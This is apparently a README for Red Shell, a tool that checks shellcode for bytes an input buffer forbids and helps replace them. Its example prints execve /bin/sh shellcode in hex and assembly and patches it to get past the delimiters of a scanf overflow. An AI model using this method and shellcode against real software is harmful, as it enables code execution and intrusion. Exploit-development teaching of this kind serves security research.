# Red Shell

## Overview

Red Shell is a tool that augments the capabilities of [ShellNoob](https://github.com/reyammer/shellnoob).
Frequently, buffers have restrictions on which bytes are allowed.
Red Shell helps you both detect and fix prohibited bytes in your shellcode.

You could say that ShellNoob produces the green shell, and Red Shell helps home the shellcode-based attack
and navigate around any restrictions for the input buffer, turning that green shell into a red shell.

## Example

Let's assume that we found a buffer overflow vulnerability in an x86 application with a `scanf()` call:

```c
scanf("name: %s", buffer)  // Buffer can overflow!
```

To develop an exploit for this buffer overflow, you could download some
[shellcode from shell-storm](http://shell-storm.org/shellcode/files/shellcode-827.php),
but this shellcode won't work out of the box.

### Detecting Prohibited Bytes

Let's use Red Shell to analyze this shellcode. For our blacklist of prohibited bytes,
we will use the delimiters for a string argument in `scanf()`.

```
> ./redshell.py --from-shellstorm 827 --blacklist=00,09-0d,20 --intel
--------
Hex Dump
--------
00000000: 31c0 5068 2f2f 7368 682f 6269 6e89 e350  1.Ph//shh/bin..P
00000010: 5389 e1b0 0bcd 80                        S......

--------
Assembly
--------
xor eax,eax                      # 31c0
push eax                         # 50
push 0x68732f2f                  # 682f2f7368
push 0x6e69622f                  # 682f62696e
mov ebx,esp                      # 89e3
push eax                         # 50
push ebx                         # 53
mov ecx,esp                      # 89e1
mov al,0xb                       # b00b
    0b [index 0x14]
int 0x80                         # cd80

prohibited bytes found
```

It looks like the `mov al, 0xb` instruction contains a prohibited byte: `0b`. `scanf()` will treat this byte as a delimiter.

### Fixing Prohibited Bytes

Next, let's try to find a way to replace this instruction. Red Shell has one additional format that can let us directly test assembly instructions.

```
> ./redshell.py --from-asm-text 'mov al,0x3b; sub al,0x30' --blacklist=00,09-0d,20 --intel
--------
Hex Dump
--------
00000000: b03b 2c30                                .;,0

--------
Assembly
--------
mov al,0x3b                      # b03b
sub al,0x30                      # 2c30

no prohibited bytes found
```

Now we can patch our shellcode with these new instructions, and we have shellcode that works for this buffer.

## Notes

*   Input Formats
    *   Red Shell supports any input format that ShellNoob supports.
    *   Red Shell also supports ShellNoob's `--64` and `--intel` options.
*   Prohibited Bytes
    *   Red Shell can use either a custom `--blacklist` or a custom `--whitelist`.
    *   By default, Red Shell will check for nulls \[`00`\] and newlines \[`0a`\].
